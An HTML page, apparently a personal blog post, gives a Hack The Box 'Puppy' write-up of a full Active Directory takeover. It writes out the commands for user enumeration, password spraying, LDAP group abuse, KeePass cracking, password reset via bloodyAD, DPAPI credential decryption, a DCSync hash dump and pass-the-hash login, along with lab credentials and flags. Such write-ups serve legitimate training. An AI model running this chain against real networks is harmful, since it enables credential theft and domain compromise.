@@ -1,0 +1,883 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Puppy Writeup | PLSCARRYME - HTB Writeups</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            color: #e0e0e0;
+            line-height: 1.8;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        header {
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(10px);
+            border-bottom: 2px solid #9fef00;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 0;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #9fef00;
+            text-decoration: none;
+        }
+
+        .back-link {
+            color: #9fef00;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: opacity 0.3s ease;
+        }
+
+        .back-link:hover {
+            opacity: 0.8;
+        }
+
+        /* Writeup Header */
+        .writeup-header {
+            text-align: center;
+            padding: 3rem 0;
+            border-bottom: 1px solid rgba(159, 239, 0, 0.2);
+            margin-bottom: 3rem;
+        }
+
+        .writeup-title {
+            font-size: 3rem;
+            color: #9fef00;
+            margin-bottom: 1rem;
+            text-shadow: 0 0 20px rgba(159, 239, 0, 0.3);
+        }
+
+        .writeup-meta {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            opacity: 0.8;
+        }
+
+        .difficulty {
+            padding: 0.5rem 1rem;
+            border-radius: 25px;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 0.9rem;
+        }
+
+        .difficulty.easy { background: #28a745; }
+        .difficulty.medium { background: #ffc107; color: #000; }
+        .difficulty.hard { background: #dc3545; }
+
+        .writeup-tags {
+            display: flex;
+            justify-content: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .tag {
+            background: rgba(159, 239, 0, 0.2);
+            color: #9fef00;
+            padding: 0.3rem 0.8rem;
+            border-radius: 15px;
+            font-size: 0.8rem;
+        }
+
+        /* Content */
+        .writeup-content {
+            padding-bottom: 3rem;
+        }
+
+        .writeup-content h1,
+        .writeup-content h2,
+        .writeup-content h3 {
+            color: #9fef00;
+            margin: 2rem 0 1rem 0;
+            border-left: 4px solid #9fef00;
+            padding-left: 1rem;
+        }
+
+        .writeup-content h1 { font-size: 2rem; }
+        .writeup-content h2 { font-size: 1.5rem; }
+        .writeup-content h3 { font-size: 1.2rem; }
+
+        .writeup-content p {
+            margin-bottom: 1.5rem;
+            text-align: justify;
+        }
+
+        .writeup-content ul,
+        .writeup-content ol {
+            margin: 1rem 0 1.5rem 2rem;
+        }
+
+        .writeup-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        /* Code blocks */
+        .writeup-content pre {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(159, 239, 0, 0.3);
+            border-radius: 8px;
+            padding: 1.5rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            position: relative;
+        }
+
+        .writeup-content code {
+            color: #9fef00;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        .writeup-content p code {
+            background: rgba(159, 239, 0, 0.2);
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.85rem;
+        }
+
+        /* Images */
+        .writeup-content img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin: 2rem 0;
+            border: 1px solid rgba(159, 239, 0, 0.3);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        /* Blockquotes */
+        .writeup-content blockquote {
+            border-left: 4px solid #9fef00;
+            background: rgba(159, 239, 0, 0.1);
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+            font-style: italic;
+        }
+
+        /* Table of Contents */
+        .toc {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(159, 239, 0, 0.3);
+            border-radius: 8px;
+            padding: 2rem;
+            margin: 2rem 0;
+        }
+
+        .toc h3 {
+            color: #9fef00;
+            margin-bottom: 1rem;
+            border: none;
+            padding: 0;
+        }
+
+        .toc ul {
+            list-style: none;
+            margin: 0;
+        }
+
+        .toc ul li {
+            margin-bottom: 0.5rem;
+        }
+
+        .toc a {
+            color: #e0e0e0;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .toc a:hover {
+            color: #9fef00;
+        }
+
+        /* Navigation buttons */
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin: 3rem 0;
+            gap: 1rem;
+        }
+
+        .nav-button {
+            background: linear-gradient(45deg, #9fef00, #7bc800);
+            color: #000;
+            padding: 1rem 2rem;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            text-decoration: none;
+            transition: transform 0.2s ease;
+            flex: 1;
+            text-align: center;
+            max-width: 200px;
+        }
+
+        .nav-button:hover {
+            transform: translateY(-2px);
+        }
+
+        .nav-button.disabled {
+            background: rgba(255, 255, 255, 0.1);
+            color: #666;
+            cursor: not-allowed;
+        }
+
+        /* Progress bar */
+        .reading-progress {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 0%;
+            height: 3px;
+            background: linear-gradient(to right, #9fef00, #7bc800);
+            z-index: 1000;
+            transition: width 0.1s ease;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .writeup-title {
+                font-size: 2rem;
+            }
+
+            .writeup-meta {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            .writeup-content pre {
+                padding: 1rem;
+                font-size: 0.8rem;
+            }
+
+            .nav-buttons {
+                flex-direction: column;
+            }
+
+            .nav-button {
+                max-width: none;
+            }
+        }
+
+        /* Highlight boxes */
+        .info-box {
+            background: rgba(0, 123, 255, 0.1);
+            border-left: 4px solid #007bff;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .warning-box {
+            background: rgba(255, 193, 7, 0.1);
+            border-left: 4px solid #ffc107;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .success-box {
+            background: rgba(40, 167, 69, 0.1);
+            border-left: 4px solid #28a745;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .step-section {
+            margin: 3rem 0;
+            padding: 2rem;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 12px;
+            border: 1px solid rgba(159, 239, 0, 0.1);
+        }
+
+        /* Toggle sections */
+        details {
+            margin: 2rem 0;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 12px;
+            border: 1px solid rgba(159, 239, 0, 0.1);
+        }
+
+        summary {
+            font-weight: 600;
+            font-size: 1.5em;
+            line-height: 1.3;
+            margin: 0;
+            padding: 1.5rem;
+            cursor: pointer;
+            color: #9fef00;
+            border-radius: 12px;
+            transition: background 0.3s ease;
+        }
+
+        summary:hover {
+            background: rgba(159, 239, 0, 0.05);
+        }
+
+        details[open] summary {
+            border-bottom: 1px solid rgba(159, 239, 0, 0.2);
+            border-radius: 12px 12px 0 0;
+        }
+
+        .indented {
+            padding: 1.5rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="reading-progress" id="reading-progress"></div>
+    
+    <header>
+        <nav class="container">
+            <a href="index.html" class="logo"><i class="fas fa-terminal"></i> PLSCARRYME</a>
+            <a href="index.html" class="back-link">
+                <i class="fas fa-arrow-left"></i>
+                Back to Home
+            </a>
+        </nav>
+    </header>
+
+    <main class="container">
+        <section class="writeup-header">
+            <h1 class="writeup-title">🐶 Puppy</h1>
+            
+            <div class="writeup-meta">
+                <div class="meta-item">
+                    <i class="fas fa-calendar"></i>
+                    <span>January 19, 2025</span>
+                </div>
+                <div class="meta-item">
+                    <i class="fas fa-desktop"></i>
+                    <span>Windows</span>
+                </div>
+                <div class="meta-item">
+                    <i class="fas fa-clock"></i>
+                    <span>6 hours</span>
+                </div>
+                <div class="meta-item">
+                    <span class="difficulty medium">Medium</span>
+                </div>
+            </div>
+
+            <div class="writeup-tags">
+                <span class="tag">Active Directory</span>
+                <span class="tag">BloodHound</span>
+                <span class="tag">KeePass</span>
+                <span class="tag">DPAPI</span>
+                <span class="tag">DCSync</span>
+                <span class="tag">GenericWrite</span>
+                <span class="tag">WinRM</span>
+            </div>
+        </section>
+
+        <section class="writeup-content">
+            <details open>
+                <summary>Enumeration</summary>
+                <div class="indented">
+                    <h3>🔍 1. Initial Enumeration – Nmap</h3>
+                    <p>I started with a full TCP service and OS scan using Nmap:</p>
+                    
+                    <pre><code class="language-bash">nmap -A -Pn -p- puppy.htb</code></pre>
+
+                    <p>Key ports identified:</p>
+                    <ul>
+                        <li><strong>Kerberos</strong> (88), <strong>LDAP</strong> (389/3268), and <strong>SMB</strong> (445) — indicating a Windows Active Directory environment</li>
+                        <li><strong>WinRM</strong> (5985) — later used for remote shell access</li>
+                        <li><strong>NFS/RPC</strong> (2049, 111) and <strong>HTTPAPI</strong> (5985)</li>
+                    </ul>
+
+                    <p>Nmap revealed the domain name: <code>PUPPY.HTB</code>, and the host is likely running <strong>Windows Server 2022</strong>.</p>
+
+                    <hr>
+
+                    <h3>📁 2. SMB Share Enumeration with Valid Credentials</h3>
+                    <p>Given credentials:</p>
+                    <pre><code class="language-text">levi.james : KingofAkron2025!</code></pre>
+
+                    <p>I enumerated SMB shares with:</p>
+                    <pre><code class="language-bash">crackmapexec smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --shares</code></pre>
+
+                    <p>🔒 Access to the <code>DEV</code> share was denied!</p>
+
+                    <hr>
+
+                    <h3>👥 3. Domain User Enumeration</h3>
+                    <p>To identify other users in the environment, I ran:</p>
+                    <pre><code class="language-bash">crackmapexec smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --users</code></pre>
+
+                    <img src="images/puppy/user-enumeration.png" alt="Domain user enumeration results showing multiple valid users">
+
+                    <p>This revealed several valid domain users, including:</p>
+                    <ul>
+                        <li><code>adam.silver</code></li>
+                        <li><code>steph.cooper</code></li>
+                        <li><code>ant.edwards</code></li>
+                        <li><code>jamie.williams</code></li>
+                        <li><code>steph.cooper_adm</code></li>
+                    </ul>
+
+                    <p>I saved these usernames into a <code>users.txt</code> file for later spraying.</p>
+
+                    <hr>
+
+                    <h3>🧠 4. Active Directory Enumeration with BloodHound</h3>
+                    <p>To analyze Active Directory permissions and relationships, I used BloodHound with the following command:</p>
+                    <pre><code class="language-bash">bloodhound-python -dc DC.PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.11.70</code></pre>
+
+                    <img src="images/puppy/bloodhound-collection.png" alt="BloodHound data collection process">
+
+                    <p>To make import easier into BloodHound GUI, I zipped the output:</p>
+                    <pre><code class="language-bash">zip bloodhound.zip *.json</code></pre>
+
+                    <hr>
+
+                    <h3>🔎 5. BloodHound Analysis — Graph Relationships</h3>
+                    
+                    <img src="images/puppy/bloodhound-graph.png" alt="BloodHound graph showing privilege relationships and attack paths">
+
+                    <p>After importing the <code>bloodhound_results.json</code> files into BloodHound, I observed the following privilege relationships for the user <code>levi.james@puppy.htb</code>.</p>
+
+                    <p>Key findings from the visual graph:</p>
+                    <ul>
+                        <li><strong>Membership</strong>: <code>levi.james</code> is a direct member of several groups including <code>HR@PUPPY.HTB</code></li>
+                        <li><strong>Privilege Escalation Opportunity</strong>: The <code>HR@PUPPY.HTB</code> group has <strong>GenericWrite</strong> privilege over the <code>DEVELOPERS@PUPPY.HTB</code> group</li>
+                        <li>Since <code>levi.james</code> is a member of <code>HR@PUPPY.HTB</code>, this grants the ability to <strong>modify membership</strong> of the <code>DEVELOPERS</code> group</li>
+                    </ul>
+
+                    <hr>
+
+                    <h3>🧬 6. Group Membership Abuse via LDAP — Adding to DEVELOPERS Group</h3>
+                    <p>I learned that <code>levi.james</code> had <strong>GenericWrite</strong> on the <code>DEVELOPERS</code> group.</p>
+
+                    <p>To exploit this, I crafted an LDIF file to add <code>levi.james</code> to the group:</p>
+                    <p><strong>modify.ldif:</strong></p>
+                    <pre><code class="language-text">dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
+changetype: modify
+add: member
+member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB</code></pre>
+
+                    <p>Then ran:</p>
+                    <pre><code class="language-bash">ldapmodify -x -H ldap://10.10.11.70 -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -f modify.ldif</code></pre>
+
+                    <img src="images/puppy/ldap-modify.png" alt="Successful LDAP modification adding user to DEVELOPERS group">
+
+                    <p>This successfully added <code>levi.james</code> to the <code>DEVELOPERS</code> group.</p>
+
+                    <p>LFG, now we have read permission!</p>
+
+                    <img src="images/puppy/dev-share-access.png" alt="Confirmation of access to DEV share after group modification">
+
+                    <p>Let's see what's inside the <code>DEV</code> share:</p>
+                    <pre><code class="language-bash">smbclient -U 'puppy.htb/levi.james%KingofAkron2025!' //10.10.11.70/DEV</code></pre>
+
+                    <img src="images/puppy/dev-share-contents.png" alt="Contents of DEV share showing recovery.kdbx file">
+
+                    <p>I can see some suspicious files. Let's download them and hope they aren't viruses</p>
+
+                    <img src="images/puppy/file-download.png" alt="Downloading files from DEV share">
+
+                    <p><code>recovery.kdbx</code> is a KeePass database file likely contains stored credentials and it is encrypted</p>
+                </div>
+            </details>
+
+            <details open>
+                <summary>KeePass Database Exploitation</summary>
+                <div class="indented">
+                    <h3>🔐 7. Cracking <code>recovery.kdbx</code> — KeePass Database</h3>
+                    <p>Since it was a <code>.kdbx</code> file (KeePass v4 format), the usual <code>keepass2john</code> tool didn't work:</p>
+                    <pre><code class="language-bash">keepass2john recovery.kdbx > recovery.hash
+# Output: File version '40000' is currently not supported!</code></pre>
+
+                    <p>So I used an alternative tool: <a href="https://github.com/r3nt0n/keepass4brute">keepass4brute</a>, which supports KeePass v4.</p>
+
+                    <h3>✅ Steps to crack:</h3>
+                    <pre><code class="language-bash">wget https://github.com/r3nt0n/keepass4brute/raw/master/keepass4brute.sh
+chmod +x keepass4brute.sh
+sudo apt update && sudo apt install keepassxc # if you haven't installed this
+./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt</code></pre>
+
+                    <p>After testing thousands of passwords, it eventually found the correct master password:</p>
+
+                    <img src="images/puppy/keepass-crack.png" alt="KeePass password cracking showing successful password discovery">
+
+                    <div class="success-box">
+                        <strong>Password found:</strong> liverpool
+                    </div>
+
+                    <hr>
+
+                    <h3>🧩 8. Accessing KeePass Database via GUI (KeePassXC)</h3>
+                    <p>Using the <strong>KeePassXC GUI</strong>, which provides a user-friendly interface to browse entries securely.</p>
+
+                    <img src="images/puppy/keepassxc-gui.png" alt="KeePassXC GUI interface showing database unlock">
+
+                    <p>Steps:</p>
+                    <ol>
+                        <li>I launched KeePassXC on my Kali machine: <code>keepassxc</code></li>
+                        <li>Opened the file: <code>recovery.kdbx</code></li>
+                        <li>When prompted, I entered the cracked master password: <code>liverpool</code></li>
+                        <li>Once unlocked, I browsed through the stored entries. The database contained several credentials — including <strong>usernames and passwords</strong> for domain accounts.</li>
+                    </ol>
+
+                    <hr>
+
+                    <h3>🔑 9. Extracted Credentials + Spray</h3>
+                    <p>From the KeePassXC GUI, I manually copied out the following recovered credentials:</p>
+                    <ul>
+                        <li><code>JamieLove2025!</code></li>
+                        <li><code>Antman2025!</code></li>
+                        <li><code>Steve2025!</code></li>
+                        <li><code>ILY2025!</code></li>
+                        <li><code>HJKL2025!</code></li>
+                    </ul>
+
+                    <p>I saved these into a text file (<code>passwords_spray.txt</code>) and used them to conduct a password spray across known domain users:</p>
+                    <pre><code class="language-bash">crackmapexec smb 10.10.11.70 -u users.txt -p password_spray.txt --continue-on-success</code></pre>
+
+                    <img src="images/puppy/password-spray.png" alt="Password spray results showing valid credential discovery">
+
+                    <div class="success-box">
+                        <strong>Valid credential found:</strong> ant.edwards:Antman2025!
+                    </div>
+                </div>
+            </details>
+
+            <details open>
+                <summary>Privilege Escalation via ACL Abuse</summary>
+                <div class="indented">
+                    <h3>🔎 10. BloodHound Analysis — Escalation via <code>adam.silver</code></h3>
+                    <p>To uncover further privilege relationships and escalation paths, I ran BloodHound as the newly discovered user:</p>
+                    <pre><code class="language-bash">bloodhound-python -u 'ant.edwards' -p 'Antman2025!' -d puppy.htb -dc DC.PUPPY.HTB -c All -ns 10.10.11.70 -o bloodhound_ant</code></pre>
+
+                    <p>Then zipped the results for GUI import:</p>
+                    <pre><code class="language-bash">zip bloodhound_ant.zip bloodhound_ant/*.json</code></pre>
+
+                    <img src="images/puppy/bloodhound-escalation.png" alt="BloodHound graph showing escalation path through adam.silver">
+
+                    <p>The graph revealed a <strong>clear and exploitable escalation path</strong>:</p>
+                    <ul>
+                        <li><code>ANT.EDWARDS@PUPPY.HTB</code> is a member of the <code>SENIOR DEVS@PUPPY.HTB</code> group</li>
+                        <li>This group has <strong>GenericAll</strong> rights over <code>ADAM.SILVER@PUPPY.HTB</code>, which means full control — including the ability to reset the user's password</li>
+                        <li>Furthermore, <code>adam.silver</code> has <strong>CanPSRemote</strong> rights on <code>DC.PUPPY.HTB</code> — the <strong>Domain Controller</strong></li>
+                        <li>This creates a direct escalation chain:</li>
+                    </ul>
+
+                    <pre><code class="language-text">ant.edwards → GenericAll → adam.silver → CanPSRemote → Domain Controller</code></pre>
+
+                    <h3>🎯 Game Plan</h3>
+                    <p>To exploit this path, I planned the following steps:</p>
+                    <ol>
+                        <li>Use <code>bloodyAD</code> to reset the password for <code>adam.silver</code></li>
+                        <li>Ensure the account is enabled</li>
+                        <li>Log in as <code>adam.silver</code> via WinRM</li>
+                        <li>Use the access to run commands on the DC</li>
+                    </ol>
+
+                    <blockquote>
+                        ✅ This is a textbook Privilege Escalation via ACL abuse + PSRemoting path.
+                    </blockquote>
+                </div>
+            </details>
+
+            <details open>
+                <summary>Shell as <code>adam.silver</code></summary>
+                <div class="indented">
+                    <h3>🔧 11. ACL Abuse – Resetting <code>adam.silver</code> Password</h3>
+                    <p>Using <code>bloodyAD</code>, I reset the password for <code>adam.silver</code>:</p>
+                    <pre><code class="language-bash">bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip 10.10.11.70 set password adam.silver 'P@ssword123'</code></pre>
+
+                    <img src="images/puppy/password-reset.png" alt="Successful password reset for adam.silver using bloodyAD">
+
+                    <p>The password was successfully changed ✅.</p>
+
+                    <hr>
+
+                    <h3>🛑 12. Fixing STATUS_ACCOUNT_DISABLED</h3>
+                    <p>I attempted to login, but the account was disabled:</p>
+                    <pre><code class="language-bash">crackmapexec smb 10.10.11.70 -u 'adam.silver' -p 'P@ssword123' -d PUPPY.HTB
+# Output: STATUS_ACCOUNT_DISABLED</code></pre>
+
+                    <img src="images/puppy/account-disabled.png" alt="Account disabled error when attempting to authenticate">
+
+                    <p>To fix this, I removed the <code>ACCOUNTDISABLE</code> flag using:</p>
+                    <pre><code class="language-bash">bloodyAD --host 10.10.11.70 -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE</code></pre>
+
+                    <hr>
+
+                    <h3>✅ 13. Confirming Access with WinRM</h3>
+                    <p>After re-enabling the account, I confirmed that the credentials work and I had remote access:</p>
+
+                    <img src="images/puppy/winrm-success.png" alt="Successful WinRM authentication after account re-enabling">
+
+                    <pre><code class="language-bash">crackmapexec winrm 10.10.11.70 -u 'adam.silver' -p 'P@ssword123' -d PUPPY.HTB
+# Output: Pwn3d!</code></pre>
+
+                    <p>Then spawned a remote shell:</p>
+
+                    <img src="images/puppy/evil-winrm-shell.png" alt="Evil-WinRM shell access as adam.silver">
+
+                    <pre><code class="language-bash">evil-winrm -i 10.10.11.70 -u 'adam.silver' -p 'P@ssword123'</code></pre>
+
+                    <hr>
+
+                    <h3>🧾 14. Reading the <code>user.txt</code> Flag</h3>
+                    <p>Once inside, I navigated to the desktop and grabbed the flag:</p>
+                    <pre><code class="language-powershell">cd C:\Users\adam.silver\Desktop
+type user.txt</code></pre>
+
+                    <img src="images/puppy/user-flag.png" alt="Successfully captured user.txt flag">
+
+                    <div class="success-box">
+                        <strong>User Flag:</strong> Successfully captured user.txt: 6e7425c383bf22a83e6cc6ce118f47de
+                    </div>
+                </div>
+            </details>
+
+            <details open>
+                <summary>Shell as <code>steph.cooper</code> + admin</summary>
+                <div class="indented">
+                    <h3>📈 15. Further BloodHound on <code>adam.silver</code></h3>
+                    <p>To check for possible privilege escalation to Domain Admin, I ran BloodHound as <code>adam.silver</code>:</p>
+                    <pre><code class="language-bash">bloodhound-python -u 'adam.silver' -p 'P@ssword123' -d puppy.htb -dc DC.PUPPY.HTB -c All -ns 10.10.11.70 -o bloodhound_adam</code></pre>
+
+                    <p>Zipped the results:</p>
+                    <pre><code class="language-bash">zip bloodhound_adam.zip bloodhound_adam_*.json</code></pre>
+
+                    <p>Imported into BloodHound GUI, I searched for the shortest path to <strong>Domain Admin</strong>.</p>
+
+                    <img src="images/puppy/bloodhound-domain-admin.png" alt="BloodHound analysis showing path to Domain Admin privileges">
+
+                    <p>After uploading and analyzing the graph, I observed:</p>
+                    <ul>
+                        <li><code>adam.silver</code> has <strong>CanPSRemote</strong> on <code>DC.PUPPY.HTB</code> — confirming remote PowerShell (WinRM) access to the Domain Controller</li>
+                        <li><code>steph.cooper</code> is a member of <code>ACCOUNT OPERATORS</code></li>
+                        <li><code>steph.cooper_adm</code> is a member of the <code>ADMINISTRATORS</code> group</li>
+                        <li>Most importantly, <code>steph.cooper_adm</code> has <strong>GetChanges</strong>, <strong>GetChangesAll</strong>, and <strong>ReplicateDirectoryChanges</strong> rights on the domain — these permissions are required for a <strong>DCSync</strong> attack</li>
+                        <li>Therefore, escalating to <code>steph.cooper_adm</code> is the final step toward dumping domain credentials</li>
+                    </ul>
+
+                    <p>This sets the stage for <strong>domain takeover</strong> using <code>secretsdump.py</code> after retrieving the credentials for <code>steph.cooper_adm</code>.</p>
+
+                    <h3>🛠 16. Gaining <code>steph.cooper_adm</code> Credentials (DPAPI Extraction)</h3>
+                    <pre><code class="language-powershell">*Evil-WinRM* PS C:\Backups> dir
+
+    Directory: C:\Backups
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip</code></pre>
+
+                    <p>After downloading and extracting it locally, I found an interesting file:</p>
+                    <pre><code class="language-text">nms-auth-config.xml.bak</code></pre>
+
+                    <p>Inside the file:</p>
+                    <pre><code class="language-xml">&lt;bind-dn&gt;cn=steph.cooper,dc=puppy,dc=htb&lt;/bind-dn&gt;
+&lt;bind-password&gt;ChefSteph2025!&lt;/bind-password&gt;</code></pre>
+
+                    <div class="success-box">
+                        <strong>New credential discovered:</strong> steph.cooper : ChefSteph2025!
+                    </div>
+
+                    <hr>
+
+                    <h3>🔓 17. Extracting DPAPI Secrets from <code>steph.cooper</code></h3>
+                    <p>I used Evil-WinRM to connect as <code>steph.cooper</code> and enumerate the user's DPAPI-protected secrets.</p>
+
+                    <ol>
+                        <li>Identified the <strong>master key</strong>:</li>
+                    </ol>
+                    <pre><code class="language-text">C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\
+    └── 556a2412-1275-4ccf-b721-e6a0b4f90407</code></pre>
+
+                    <ol start="2">
+                        <li>Found a <strong>DPAPI credential blob</strong>:</li>
+                    </ol>
+                    <pre><code class="language-text">C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\
+    └── C8D69EBE9A43E9DEBF6B5FBD48B521B9</code></pre>
+
+                    <ol start="3">
+                        <li>Transferred both files using an Impacket SMB server, and decrypted them with:</li>
+                    </ol>
+                    <pre><code class="language-bash"># Decrypt masterkey
+python3 dpapi.py masterkey -file 556a2412-... -password 'ChefSteph2025!' -sid S-1-5-21-...
+
+# Decrypt credential
+python3 dpapi.py credential -file C8D69EBE9... -key &lt;decrypted_master_key&gt;</code></pre>
+
+                    <div class="success-box">
+                        <strong>Recovered credential:</strong> steph.cooper_adm : FivethChipOnItsWay2025!
+                    </div>
+
+                    <hr>
+
+                    <h3>🔓 18. DCSync Attack — Domain Takeover</h3>
+                    <p>After confirming the <code>steph.cooper_adm</code> credentials, I ran BloodHound again:</p>
+                    <pre><code class="language-bash">bloodhound-python -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' -d puppy.htb -dc DC.PUPPY.HTB -c All -ns 10.10.11.70 -o bloodhound_admin</code></pre>
+
+                    <p>The graph confirmed: ✅ <code>steph.cooper_adm</code> has <strong>DCSync privileges</strong>.</p>
+
+                    <p>Using <code>secretsdump.py</code>, I executed the DCSync attack:</p>
+                    <pre><code class="language-bash">secretsdump.py 'PUPPY.HTB/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70</code></pre>
+
+                    <p>Successfully dumped domain hashes, including the <strong>Administrator NTLM hash</strong>:</p>
+                    <pre><code class="language-text">Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::</code></pre>
+
+                    <hr>
+
+                    <h3>⚡ 19. Final Pwn — Administrator Shell via WinRM</h3>
+                    <p>Logged in with the NT hash:</p>
+                    <pre><code class="language-bash">evil-winrm -i 10.10.11.70 -u 'Administrator' -H 'bb0edc15e49ceb4120c7bd7e6e65d75b'</code></pre>
+
+                    <p>Boom — Admin shell acquired.</p>
+
+                    <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt</code></pre>
+
+                    <div class="success-box">
+                        <strong>Root Flag:</strong> f6fdf655fc4fb36629866d164f987b73
+                    </div>
+
+                    <p>🏁 <strong>Rooted puppy.htb</strong></p>
+                </div>
+            </details>
+
+            <!-- Summary Section -->
+            <div class="step-section">
+                <h2>🎯 Attack Chain Summary</h2>
+                <p>This box demonstrated a complete Active Directory takeover through multiple privilege escalation vectors:</p>
+
+                <pre><code class="language-text">levi.james (HR Group) 
+    → GenericWrite on DEVELOPERS 
+    → Access DEV share 
+    → KeePass database 
+    → ant.edwards credentials 
+    → GenericAll on adam.silver 
+    → WinRM access 
+    → steph.cooper credentials 
+    → DPAPI extraction 
+    → steph.cooper_adm 
+    → DCSync privileges 
+    → Administrator hash 
+    → Domain Admin</code></pre>
+
+                <h3>Key Techniques Demonstrated</h3>
+                <ul>
+                    <li><strong>Active Directory Enumeration:</strong> Using BloodHound for privilege escalation path discovery</li>
+                    <li><strong>Group Membership Manipulation:</strong> Exploiting GenericWrite permissions via LDAP</li>
+                    <li><strong>KeePass Database Exploitation:</strong> Cracking v4 databases and extracting credentials</li>
+                    <li><strong>ACL Abuse:</strong> Leveraging GenericAll permissions for password resets</li>
+                    <li><strong>DPAPI Credential Extraction:</strong> Decrypting stored credentials from user profiles</li>
+                    <li><strong>DCSync Attack:</strong> Domain takeover through replication rights abuse</li>
+                </ul>
+
+                <h3>Tools Used</h3>
+                <ul>
+                    <li><strong>Nmap:</strong> Network reconnaissance and service enumeration</li>
+                    <li><strong>CrackMapExec:</strong> SMB enumeration and credential validation</li>
+                    <li><strong>BloodHound:</strong> Active Directory relationship analysis</li>
+                    <li><strong>keepass4brute:</strong> KeePass v4 database cracking</li>
+                    <li><strong>bloodyAD:</strong> Active Directory manipulation and ACL abuse</li>
+                    <li><strong>dpapi.py:</strong> DPAPI credential extraction</li>
+                    <li><strong>secretsdump.py:</strong> DCSync attack execution</li>
+                    <li><strong>Evil-WinRM:</strong> Remote PowerShell access</li>
+                </ul>
+
+                <div class="warning-box">
+                    <strong>Defensive Recommendations:</strong> Regular ACL audits, principle of least privilege, secure credential storage, and monitoring for unusual AD modifications can help prevent these attack vectors.
+                </div>
+            </div>
+        </section>
+
+        <div class="nav-buttons">
+            <a href="index.html" class="nav-button">
+                <i class="fas fa-home"></i> Back to Home
+            </a>
+            <a href="#" class="nav-button disabled">
+                Next Writeup <i class="fas fa-arrow-right"></i>
+            </a>
+        </div>
+    </main>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+    
+    <script>
+        // Reading progress bar
+        function updateReadingProgress() {
+            const article = document.querySelector('.writeup-content');
+            const progressBar = document.getElementById('reading-progress');
+            
+            const articleTop = article.offsetTop;
+            const articleHeight = article.offsetHeight;
+            const windowHeight = window.innerHeight;
+            const scrollTop = window.pageYOffset;
+            
+            const progress = (scrollTop - articleTop + windowHeight/2) / articleHeight;
+            const progressPercentage = Math.max(0, Math.min(100, progress * 100));
+            
+            progressBar.style.width = progressPercentage + '%';
+        }
+
+        // Smooth scrolling for TOC links
+        document.querySelectorAll('.toc a').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
